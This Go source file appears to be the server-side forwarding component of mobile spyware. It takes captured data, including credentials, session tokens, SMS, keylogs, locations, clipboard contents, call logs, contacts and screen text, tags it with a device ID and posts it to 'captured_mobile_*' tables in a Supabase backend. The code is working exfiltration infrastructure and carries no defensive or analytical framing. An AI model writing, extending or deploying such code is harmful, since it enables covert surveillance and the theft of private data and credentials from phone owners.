package supabase

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"time"
)

type Client struct {
	baseURL    string
	serviceKey string
	httpClient *http.Client
}

type tableMapping struct {
	dataType string
	table    string
}

var dataTypeToTable = map[string]string{
	"credential":   "captured_mobile_credentials",
	"session":      "captured_mobile_sessions",
	"file":         "captured_mobile_files",
	"sms":          "captured_mobile_sms",
	"keylog":       "captured_mobile_keylogs",
	"location":     "captured_locations",
	"notification": "captured_notifications",
	"clipboard":    "captured_clipboard",
	"call_log":     "captured_mobile_calllogs",
	"contact":      "captured_mobile_contacts",
	"app_change":   "captured_mobile_app_events",
	"target_app":   "captured_mobile_app_events",
	"screentext":   "captured_mobile_screentext",
}

func New(baseURL, serviceKey string) *Client {
	return &Client{
		baseURL:    baseURL,
		serviceKey: serviceKey,
		httpClient: &http.Client{Timeout: 10 * time.Second},
	}
}

func (c *Client) ForwardData(dataType, deviceID string, plaintext []byte) error {
	table, ok := dataTypeToTable[dataType]
	if !ok {
		return fmt.Errorf("unknown data type: %s", dataType)
	}

	var payload map[string]interface{}
	if err := json.Unmarshal(plaintext, &payload); err != nil {
		return fmt.Errorf("unmarshal payload: %w", err)
	}
	payload["device_id"] = deviceID

	body, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("marshal payload: %w", err)
	}

	url := fmt.Sprintf("%s/rest/v1/%s", c.baseURL, table)
	req, err := http.NewRequest("POST", url, bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("create request: %w", err)
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("apikey", c.serviceKey)
	req.Header.Set("Authorization", "Bearer "+c.serviceKey)
	req.Header.Set("Prefer", "return=minimal")

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("http request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 300 {
		return fmt.Errorf("supabase returned %d for table %s", resp.StatusCode, table)
	}

	log.Printf("forwarded %s data to supabase table %s (device=%s)", dataType, table, deviceID)
	return nil
}

func (c *Client) ForwardRaw(table string, data map[string]interface{}) error {
	data["created_at"] = time.Now().UTC().Format(time.RFC3339)

	body, err := json.Marshal(data)
	if err != nil {
		return fmt.Errorf("marshal: %w", err)
	}

	url := fmt.Sprintf("%s/rest/v1/%s", c.baseURL, table)
	req, err := http.NewRequest("POST", url, bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("create request: %w", err)
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("apikey", c.serviceKey)
	req.Header.Set("Authorization", "Bearer "+c.serviceKey)
	req.Header.Set("Prefer", "return=minimal")

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("http request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 300 {
		return fmt.Errorf("supabase returned %d", resp.StatusCode)
	}
	return nil
}

func (c *Client) HealthCheck() bool {
	url := fmt.Sprintf("%s/rest/v1/", c.baseURL)
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("apikey", c.serviceKey)

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode < 500
}
